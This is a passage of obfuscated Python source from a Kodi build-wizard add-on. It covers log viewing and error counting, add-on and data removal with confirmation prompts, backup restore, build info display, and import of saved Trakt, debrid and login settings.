			wiz .setS (OO00OOOO00O0O0O00 ,O0000OO0000O000OO )#line:4116
def playVideo (OOO00OO000O000O0O ):#line:4118
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOO00OO000O000O0O )#line:4119
	if 'watch?v='in OOO00OO000O000O0O :#line:4120
		O0O0OOO0O0O0OOOOO ,O0OO00OO0OO0O00OO =OOO00OO000O000O0O .split ('?')#line:4121
		OOO00O0O0OO000O00 =O0OO00OO0OO0O00OO .split ('&')#line:4122
		for OOOO00O0O0OOOOO0O in OOO00O0O0OO000O00 :#line:4123
			if OOOO00O0O0OOOOO0O .startswith ('v='):#line:4124
				OOO00OO000O000O0O =OOOO00O0O0OOOOO0O [2 :]#line:4125
				break #line:4126
			else :continue #line:4127
	elif 'embed'in OOO00OO000O000O0O or 'youtu.be'in OOO00OO000O000O0O :#line:4128
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOO00OO000O000O0O )#line:4129
		O0O0OOO0O0O0OOOOO =OOO00OO000O000O0O .split ('/')#line:4130
		if len (O0O0OOO0O0O0OOOOO [-1 ])>5 :#line:4131
			OOO00OO000O000O0O =O0O0OOO0O0O0OOOOO [-1 ]#line:4132
		elif len (O0O0OOO0O0O0OOOOO [-2 ])>5 :#line:4133
			OOO00OO000O000O0O =O0O0OOO0O0O0OOOOO [-2 ]#line:4134
	wiz .log ("YouTube URL: %s"%OOO00OO000O000O0O )#line:4135
	yt .PlayVideo (OOO00OO000O000O0O )#line:4136
def viewLogFile ():#line:4138
	O0OOOOO00000OOO00 =wiz .Grab_Log (True )#line:4139
	O0O0O0O00O0OO000O =wiz .Grab_Log (True ,True )#line:4140
	O0O0O000O00O0000O =0 ;OOOOOOOO0O0OOO000 =O0OOOOO00000OOO00 #line:4141
	if not O0O0O0O00O0OO000O ==False and not O0OOOOO00000OOO00 ==False :#line:4142
		O0O0O000O00O0000O =DIALOG .select (ADDONTITLE ,["View %s"%O0OOOOO00000OOO00 .replace (LOG ,""),"View %s"%O0O0O0O00O0OO000O .replace (LOG ,"")])#line:4143
		if O0O0O000O00O0000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4144
	elif O0OOOOO00000OOO00 ==False and O0O0O0O00O0OO000O ==False :#line:4145
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4146
		return #line:4147
	elif not O0OOOOO00000OOO00 ==False :O0O0O000O00O0000O =0 #line:4148
	elif not O0O0O0O00O0OO000O ==False :O0O0O000O00O0000O =1 #line:4149
	OOOOOOOO0O0OOO000 =O0OOOOO00000OOO00 if O0O0O000O00O0000O ==0 else O0O0O0O00O0OO000O #line:4151
	OOOOO0000O0OOO0OO =wiz .Grab_Log (False )if O0O0O000O00O0000O ==0 else wiz .Grab_Log (False ,True )#line:4152
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOOOOOO0O0OOO000 ),OOOOO0000O0OOO0OO )#line:4154
def errorChecking (log =None ,count =None ,all =None ):#line:4156
	if log ==None :#line:4157
		O0000O00000O0O00O =wiz .Grab_Log (True )#line:4158
		OOO000O000OOO0O00 =wiz .Grab_Log (True ,True )#line:4159
		if not OOO000O000OOO0O00 ==False and not O0000O00000O0O00O ==False :#line:4160
			O000O000O00O0OO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0000O00000O0O00O .replace (LOG ,""),errorChecking (O0000O00000O0O00O ,True ,True )),"View %s: %s error(s)"%(OOO000O000OOO0O00 .replace (LOG ,""),errorChecking (OOO000O000OOO0O00 ,True ,True ))])#line:4161
			if O000O000O00O0OO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4162
		elif O0000O00000O0O00O ==False and OOO000O000OOO0O00 ==False :#line:4163
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4164
			return #line:4165
		elif not O0000O00000O0O00O ==False :O000O000O00O0OO00 =0 #line:4166
		elif not OOO000O000OOO0O00 ==False :O000O000O00O0OO00 =1 #line:4167
		log =O0000O00000O0O00O if O000O000O00O0OO00 ==0 else OOO000O000OOO0O00 #line:4168
	if log ==False :#line:4169
		if count ==None :#line:4170
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4171
			return False #line:4172
		else :#line:4173
			return 0 #line:4174
	else :#line:4175
		if os .path .exists (log ):#line:4176
			OOO00O0OO00OO0OO0 =open (log ,mode ='r');O0OOOOO000OO000OO =OOO00O0OO00OO0OO0 .read ().replace ('\n','').replace ('\r','');OOO00O0OO00OO0OO0 .close ()#line:4177
			O0000OO0OO00000OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OOOOO000OO000OO )#line:4178
			if not count ==None :#line:4179
				if all ==None :#line:4180
					OOOO0O0OO00O0O00O =0 #line:4181
					for O000OOO0OO00OOO00 in O0000OO0OO00000OO :#line:4182
						if ADDON_ID in O000OOO0OO00OOO00 :OOOO0O0OO00O0O00O +=1 #line:4183
					return OOOO0O0OO00O0O00O #line:4184
				else :return len (O0000OO0OO00000OO )#line:4185
			if len (O0000OO0OO00000OO )>0 :#line:4186
				OOOO0O0OO00O0O00O =0 ;O0000000O000O0O0O =""#line:4187
				for O000OOO0OO00OOO00 in O0000OO0OO00000OO :#line:4188
					if all ==None and not ADDON_ID in O000OOO0OO00OOO00 :continue #line:4189
					else :#line:4190
						OOOO0O0OO00O0O00O +=1 #line:4191
						O0000000O000O0O0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO0O0OO00O0O00O ,O000OOO0OO00OOO00 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4192
				if OOOO0O0OO00O0O00O >0 :#line:4193
					wiz .TextBox (ADDONTITLE ,O0000000O000O0O0O )#line:4194
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4195
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4196
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4197
ACTION_PREVIOUS_MENU =10 #line:4199
ACTION_NAV_BACK =92 #line:4200
ACTION_MOVE_LEFT =1 #line:4201
ACTION_MOVE_RIGHT =2 #line:4202
ACTION_MOVE_UP =3 #line:4203
ACTION_MOVE_DOWN =4 #line:4204
ACTION_MOUSE_WHEEL_UP =104 #line:4205
ACTION_MOUSE_WHEEL_DOWN =105 #line:4206
ACTION_MOVE_MOUSE =107 #line:4207
ACTION_SELECT_ITEM =7 #line:4208
ACTION_BACKSPACE =110 #line:4209
ACTION_MOUSE_LEFT_CLICK =100 #line:4210
ACTION_MOUSE_LONG_CLICK =108 #line:4211
def LogViewer (default =None ):#line:4213
	class O0OOOOOO0OOO00O00 (xbmcgui .WindowXMLDialog ):#line:4214
		def __init__ (OOO000000OOOOOOO0 ,*O000O0OO0OOO0O0OO ,**OOOOO00O0OOOO000O ):#line:4215
			OOO000000OOOOOOO0 .default =OOOOO00O0OOOO000O ['default']#line:4216
		def onInit (OOO00OO0OOO00O0O0 ):#line:4218
			OOO00OO0OOO00O0O0 .title =101 #line:4219
			OOO00OO0OOO00O0O0 .msg =102 #line:4220
			OOO00OO0OOO00O0O0 .scrollbar =103 #line:4221
			OOO00OO0OOO00O0O0 .upload =201 #line:4222
			OOO00OO0OOO00O0O0 .kodi =202 #line:4223
			OOO00OO0OOO00O0O0 .kodiold =203 #line:4224
			OOO00OO0OOO00O0O0 .wizard =204 #line:4225
			OOO00OO0OOO00O0O0 .okbutton =205 #line:4226
			O0OOO0OO0O00O0OO0 =open (OOO00OO0OOO00O0O0 .default ,'r')#line:4227
			OOO00OO0OOO00O0O0 .logmsg =O0OOO0OO0O00O0OO0 .read ()#line:4228
			O0OOO0OO0O00O0OO0 .close ()#line:4229
			OOO00OO0OOO00O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00OO0OOO00O0O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4230
			OOO00OO0OOO00O0O0 .showdialog ()#line:4231
		def showdialog (OOO0OOOO0O0OO00O0 ):#line:4233
			OOO0OOOO0O0OO00O0 .getControl (OOO0OOOO0O0OO00O0 .title ).setLabel (OOO0OOOO0O0OO00O0 .titlemsg )#line:4234
			OOO0OOOO0O0OO00O0 .getControl (OOO0OOOO0O0OO00O0 .msg ).setText (wiz .highlightText (OOO0OOOO0O0OO00O0 .logmsg ))#line:4235
			OOO0OOOO0O0OO00O0 .setFocusId (OOO0OOOO0O0OO00O0 .scrollbar )#line:4236
		def onClick (O0OOOO000O00O00O0 ,O0O00OO00O0OO00OO ):#line:4238
			if O0O00OO00O0OO00OO ==O0OOOO000O00O00O0 .okbutton :O0OOOO000O00O00O0 .close ()#line:4239
			elif O0O00OO00O0OO00OO ==O0OOOO000O00O00O0 .upload :O0OOOO000O00O00O0 .close ();uploadLog .Main ()#line:4240
			elif O0O00OO00O0OO00OO ==O0OOOO000O00O00O0 .kodi :#line:4241
				OOO0O00O000O00OOO =wiz .Grab_Log (False )#line:4242
				OOOO0OO0O0000O000 =wiz .Grab_Log (True )#line:4243
				if OOO0O00O000O00OOO ==False :#line:4244
					O0OOOO000O00O00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4245
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText ("Log File Does Not Exists!")#line:4246
				else :#line:4247
					O0OOOO000O00O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO0O0000O000 .replace (LOG ,''))#line:4248
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .title ).setLabel (O0OOOO000O00O00O0 .titlemsg )#line:4249
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText (wiz .highlightText (OOO0O00O000O00OOO ))#line:4250
					O0OOOO000O00O00O0 .setFocusId (O0OOOO000O00O00O0 .scrollbar )#line:4251
			elif O0O00OO00O0OO00OO ==O0OOOO000O00O00O0 .kodiold :#line:4252
				OOO0O00O000O00OOO =wiz .Grab_Log (False ,True )#line:4253
				OOOO0OO0O0000O000 =wiz .Grab_Log (True ,True )#line:4254
				if OOO0O00O000O00OOO ==False :#line:4255
					O0OOOO000O00O00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4256
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText ("Log File Does Not Exists!")#line:4257
				else :#line:4258
					O0OOOO000O00O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO0O0000O000 .replace (LOG ,''))#line:4259
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .title ).setLabel (O0OOOO000O00O00O0 .titlemsg )#line:4260
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText (wiz .highlightText (OOO0O00O000O00OOO ))#line:4261
					O0OOOO000O00O00O0 .setFocusId (O0OOOO000O00O00O0 .scrollbar )#line:4262
			elif O0O00OO00O0OO00OO ==O0OOOO000O00O00O0 .wizard :#line:4263
				OOO0O00O000O00OOO =wiz .Grab_Log (False ,False ,True )#line:4264
				OOOO0OO0O0000O000 =wiz .Grab_Log (True ,False ,True )#line:4265
				if OOO0O00O000O00OOO ==False :#line:4266
					O0OOOO000O00O00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4267
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText ("Log File Does Not Exists!")#line:4268
				else :#line:4269
					O0OOOO000O00O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO0O0000O000 .replace (ADDONDATA ,''))#line:4270
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .title ).setLabel (O0OOOO000O00O00O0 .titlemsg )#line:4271
					O0OOOO000O00O00O0 .getControl (O0OOOO000O00O00O0 .msg ).setText (wiz .highlightText (OOO0O00O000O00OOO ))#line:4272
					O0OOOO000O00O00O0 .setFocusId (O0OOOO000O00O00O0 .scrollbar )#line:4273
		def onAction (O00OO00O000OO0OOO ,OO00000O00OO00000 ):#line:4275
			if OO00000O00OO00000 ==ACTION_PREVIOUS_MENU :O00OO00O000OO0OOO .close ()#line:4276
			elif OO00000O00OO00000 ==ACTION_NAV_BACK :O00OO00O000OO0OOO .close ()#line:4277
	if default ==None :default =wiz .Grab_Log (True )#line:4278
	O00OO0OOOOOOOO000 =O0OOOOOO0OOO00O00 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4279
	O00OO0OOOOOOOO000 .doModal ()#line:4280
	del O00OO0OOOOOOOO000 #line:4281
def removeAddon (OOO00O0O000000O0O ,OO0OOO000000OO000 ,over =False ):#line:4283
	if not over ==False :#line:4284
		O0000O0O0OO00O0O0 =1 #line:4285
	else :#line:4286
		O0000O0O0OO00O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOO000000OO000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOO00O0O000000O0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4287
	if O0000O0O0OO00O0O0 ==1 :#line:4288
		O0O000OOO0000OOOO =os .path .join (ADDONS ,OOO00O0O000000O0O )#line:4289
		wiz .log ("Removing Addon %s"%OOO00O0O000000O0O )#line:4290
		wiz .cleanHouse (O0O000OOO0000OOOO )#line:4291
		xbmc .sleep (1000 )#line:4292
		try :shutil .rmtree (O0O000OOO0000OOOO )#line:4293
		except Exception as O0O0O0OOOO000OO00 :wiz .log ("Error removing %s"%OOO00O0O000000O0O ,xbmc .LOGNOTICE )#line:4294
		removeAddonData (OOO00O0O000000O0O ,OO0OOO000000OO000 ,over )#line:4295
	if over ==False :#line:4296
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0OOO000000OO000 ))#line:4297
def removeAddonData (OOOOOOO00000O000O ,name =None ,over =False ):#line:4299
	if OOOOOOO00000O000O =='all':#line:4300
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4301
			wiz .cleanHouse (ADDOND )#line:4302
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4303
	elif OOOOOOO00000O000O =='uninstalled':#line:4304
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4305
			O0O000OOO000OOO0O =0 #line:4306
			for O00OOOO0O0O0O00OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4307
				O0OO000000OOOOOOO =O00OOOO0O0O0O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4308
				if O0OO000000OOOOOOO in EXCLUDES :pass #line:4309
				elif os .path .exists (os .path .join (ADDONS ,O0OO000000OOOOOOO )):pass #line:4310
				else :wiz .cleanHouse (O00OOOO0O0O0O00OO );O0O000OOO000OOO0O +=1 ;wiz .log (O00OOOO0O0O0O00OO );shutil .rmtree (O00OOOO0O0O0O00OO )#line:4311
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OOO000OOO0O ))#line:4312
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4313
	elif OOOOOOO00000O000O =='empty':#line:4314
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4315
			O0O000OOO000OOO0O =wiz .emptyfolder (ADDOND )#line:4316
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OOO000OOO0O ))#line:4317
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4318
	else :#line:4319
		O0OOO0OO0O0O0000O =os .path .join (USERDATA ,'addon_data',OOOOOOO00000O000O )#line:4320
		if OOOOOOO00000O000O in EXCLUDES :#line:4321
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4322
		elif os .path .exists (O0OOO0OO0O0O0000O ):#line:4323
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOOO00000O000O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4324
				wiz .cleanHouse (O0OOO0OO0O0O0000O )#line:4325
				try :#line:4326
					shutil .rmtree (O0OOO0OO0O0O0000O )#line:4327
				except :#line:4328
					wiz .log ("Error deleting: %s"%O0OOO0OO0O0O0000O )#line:4329
			else :#line:4330
				wiz .log ('Addon data for %s was not removed'%OOOOOOO00000O000O )#line:4331
	wiz .refresh ()#line:4332
def restoreit (OO0O00O000000O0O0 ):#line:4334
	if OO0O00O000000O0O0 =='build':#line:4335
		O0O00O0O0O00O00O0 =freshStart ('restore')#line:4336
		if O0O00O0O0O00O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4337
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4338
		wiz .skinToDefault ()#line:4339
	wiz .restoreLocal (OO0O00O000000O0O0 )#line:4340
def restoreextit (O00O0000O0OOOO0OO ):#line:4342
	if O00O0000O0OOOO0OO =='build':#line:4343
		O0O00OO0O000OO00O =freshStart ('restore')#line:4344
		if O0O00OO0O000OO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4345
	wiz .restoreExternal (O00O0000O0OOOO0OO )#line:4346
def buildInfo (OO00O00OO000O000O ):#line:4348
	if wiz .workingURL (SPEEDFILE )==True :#line:4349
		if wiz .checkBuild (OO00O00OO000O000O ,'url'):#line:4350
			OO00O00OO000O000O ,O0O00OO0O00O0O0O0 ,O0O0O0O000O00O0OO ,O0000O00OO000OO00 ,OOO00O0O0OO0000O0 ,O00OOO00OOO0OO0OO ,O00OOO00O0O0OO0O0 ,O0OOO0OO00OO0OO0O ,O00000O0O0O0OO000 ,O0000OOOOOOOOOOO0 ,OOO0O00OOOOO00O0O =wiz .checkBuild (OO00O00OO000O000O ,'all')#line:4351
			O0000OOOOOOOOOOO0 ='Yes'if O0000OOOOOOOOOOO0 .lower ()=='yes'else 'No'#line:4352
			O0O0O00O0O0OO00O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O00OO000O000O )#line:4353
			O0O0O00O0O0OO00O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OO0O00O0O0O0 )#line:4354
			if not O00OOO00OOO0OO0OO =="http://":#line:4355
				O00OOO0000OO0OOO0 =wiz .themeCount (OO00O00OO000O000O ,False )#line:4356
				O0O0O00O0O0OO00O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00OOO0000OO0OOO0 ))#line:4357
			O0O0O00O0O0OO00O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00O0O0OO0000O0 )#line:4358
			O0O0O00O0O0OO00O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OOOOOOOOOOO0 )#line:4359
			O0O0O00O0O0OO00O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O00OOOOO00O0O )#line:4360
			wiz .TextBox (ADDONTITLE ,O0O0O00O0O0OO00O0 )#line:4361
		else :wiz .log ("Invalid Build Name!")#line:4362
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4363
def buildVideo (O000OOOO000000O00 ):#line:4365
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4366
	if wiz .workingURL (SPEEDFILE )==True :#line:4367
		OO0O0OO0O00OO00O0 =wiz .checkBuild (O000OOOO000000O00 ,'preview')#line:4368
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O000OOOO000000O00 )#line:4369
		if OO0O0OO0O00OO00O0 and not OO0O0OO0O00OO00O0 =='http://':playVideo (OO0O0OO0O00OO00O0 )#line:4370
		else :wiz .log ("[%s]Unable to find url for video preview"%O000OOOO000000O00 )#line:4371
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4372
def dependsList (O00OO00OO0O0O00OO ):#line:4374
	OOOO000OOOOO00O00 =os .path .join (ADDONS ,O00OO00OO0O0O00OO ,'addon.xml')#line:4375
	if os .path .exists (OOOO000OOOOO00O00 ):#line:4376
		O00O00000O0OO00O0 =open (OOOO000OOOOO00O00 ,mode ='r');OO0O0O00O0O000000 =O00O00000O0OO00O0 .read ();O00O00000O0OO00O0 .close ();#line:4377
		OO000OOOOO000O00O =wiz .parseDOM (OO0O0O00O0O000000 ,'import',ret ='addon')#line:4378
		OO0O0OO0000O00000 =[]#line:4379
		for OO00O00O00O000OO0 in OO000OOOOO000O00O :#line:4380
			if not 'xbmc.python'in OO00O00O00O000OO0 :#line:4381
				OO0O0OO0000O00000 .append (OO00O00O00O000OO0 )#line:4382
		return OO0O0OO0000O00000 #line:4383
	return []#line:4384
def manageSaveData (OO000O00000O0O0O0 ):#line:4386
	if OO000O00000O0O0O0 =='import':#line:4387
		O0000O00000O0O000 =os .path .join (ADDONDATA ,'temp')#line:4388
		if not os .path .exists (O0000O00000O0O000 ):os .makedirs (O0000O00000O0O000 )#line:4389
		O0O0OO00O00O0000O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4390
		if not O0O0OO00O00O0000O .endswith ('.zip'):#line:4391
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4392
			return #line:4393
		OOOOO00000OOO0O00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4394
		O00OO0OO00O0O00OO =xbmcvfs .copy (O0O0OO00O00O0000O ,OOOOO00000OOO0O00 )#line:4395
		wiz .log ("%s"%str (O00OO0OO00O0O00OO ))#line:4396
		extract .all (xbmc .translatePath (OOOOO00000OOO0O00 ),O0000O00000O0O000 )#line:4397
		O0OO000OOOOOOOOO0 =os .path .join (O0000O00000O0O000 ,'trakt')#line:4398
		OO0OOO00OO0000000 =os .path .join (O0000O00000O0O000 ,'login')#line:4399
		O000OO0000O0O0O00 =os .path .join (O0000O00000O0O000 ,'debrid')#line:4400
		OO00OO00O0000OO0O =0 #line:4401
		if os .path .exists (O0OO000OOOOOOOOO0 ):#line:4402
			OO00OO00O0000OO0O +=1 #line:4403
			O00OO00O00OOO00OO =os .listdir (O0OO000OOOOOOOOO0 )#line:4404
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4405
			for O0OOO0O00OOOOOO0O in O00OO00O00OOO00OO :#line:4406
				OO0OO0O00OOOOO0O0 =os .path .join (traktit .TRAKTFOLD ,O0OOO0O00OOOOOO0O )#line:4407
				OOOOOOOOO0O0O0O0O =os .path .join (O0OO000OOOOOOOOO0 ,O0OOO0O00OOOOOO0O )#line:4408
				if os .path .exists (OO0OO0O00OOOOO0O0 ):#line:4409
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0O00OOOOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4410
					else :os .remove (OO0OO0O00OOOOO0O0 )#line:4411
				shutil .copy (OOOOOOOOO0O0O0O0O ,OO0OO0O00OOOOO0O0 )#line:4412
			traktit .importlist ('all')#line:4413
			traktit .traktIt ('restore','all')#line:4414
		if os .path .exists (OO0OOO00OO0000000 ):#line:4415
			OO00OO00O0000OO0O +=1 #line:4416
			O00OO00O00OOO00OO =os .listdir (OO0OOO00OO0000000 )#line:4417
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4418
			for O0OOO0O00OOOOOO0O in O00OO00O00OOO00OO :#line:4419
				OO0OO0O00OOOOO0O0 =os .path .join (loginit .LOGINFOLD ,O0OOO0O00OOOOOO0O )#line:4420
				OOOOOOOOO0O0O0O0O =os .path .join (OO0OOO00OO0000000 ,O0OOO0O00OOOOOO0O )#line:4421
				if os .path .exists (OO0OO0O00OOOOO0O0 ):#line:4422
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0O00OOOOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4423
					else :os .remove (OO0OO0O00OOOOO0O0 )#line:4424
				shutil .copy (OOOOOOOOO0O0O0O0O ,OO0OO0O00OOOOO0O0 )#line:4425
			loginit .importlist ('all')#line:4426
			loginit .loginIt ('restore','all')#line:4427
		if os .path .exists (O000OO0000O0O0O00 ):#line:4428
			OO00OO00O0000OO0O +=1 #line:4429
			O00OO00O00OOO00OO =os .listdir (O000OO0000O0O0O00 )#line:4430
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4431
			for O0OOO0O00OOOOOO0O in O00OO00O00OOO00OO :#line:4432
				OO0OO0O00OOOOO0O0 =os .path .join (debridit .REALFOLD ,O0OOO0O00OOOOOO0O )#line:4433
				OOOOOOOOO0O0O0O0O =os .path .join (O000OO0000O0O0O00 ,O0OOO0O00OOOOOO0O )#line:4434
				if os .path .exists (OO0OO0O00OOOOO0O0 ):#line:4435
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0O00OOOOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4436
					else :os .remove (OO0OO0O00OOOOO0O0 )#line:4437
				shutil .copy (OOOOOOOOO0O0O0O0O ,OO0OO0O00OOOOO0O0 )#line:4438
			debridit .importlist ('all')#line:4439
			debridit .debridIt ('restore','all')#line:4440
		wiz .cleanHouse (O0000O00000O0O000 )#line:4441
		wiz .removeFolder (O0000O00000O0O000 )#line:4442
		os .remove (OOOOO00000OOO0O00 )#line:4443
		if OO00OO00O0000OO0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4444
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4445
	elif OO000O00000O0O0O0 =='export':#line:4446
		OO0OOOO000OOO0O0O =xbmc .translatePath (MYBUILDS )#line:4447
		OOOOO0OO00000OO00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4448
		traktit .traktIt ('update','all')#line:4449
